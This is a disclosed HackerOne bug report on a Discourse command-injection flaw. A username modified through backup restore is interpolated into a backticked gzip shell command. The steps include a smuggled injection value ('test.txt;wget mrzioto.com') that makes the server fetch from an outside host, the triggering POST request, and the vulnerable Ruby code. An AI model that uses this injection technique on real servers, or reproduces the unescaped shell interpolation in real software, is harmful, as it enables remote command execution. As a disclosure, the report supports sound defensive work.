# Admin Command Injection via username in user_archive ExportCsvFile

## Report Details
- **Report ID**: 214022
- **URL**: https://hackerone.com/reports/214022
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-03-16T22:05:10.800Z
- **Disclosed**: 2017-05-13T21:25:53.259Z

## Reporter
- **Username**: ziot
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: discourse

## Vulnerability Information
When a user generates a backup of their posts, their username gets sent to the `ExportCsvFile` job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.

## Steps

 1. Login as an admin on try.discourse.org, e.g.
  * http://try.discourse.org/
 2. Make a backup of the website and download it.
 3. Extract the contents of the archive.
 4. Modify one of the usernames of an account you have access to:
  * test.txt;wget mrzioto.com
 5. Repackage the archive.
 6. Upload the modified archive.
 7. Restore from backup.
 8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).
 9. Send the POST request for creating a user export archive:
  * http://34.205.246.2/export_csv/export_entity.json
  * POST: entity_type=user&entity=user_archive
 10. ---> You forced the server to make a wget leading to RCE/command injection.

## Code Flow

```
      file_name_prefix = if @entity == "user_archive"
        "#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime("%y%m%d-%H%M%S")}"

      file_name = "#{file_name_prefix}-#{file.id}.csv"
      absolute_path = "#{UserExport.base_directory}/#{file_name}"

      `gzip -5 #{absolute_path}`
```

## Attachments
No attachments
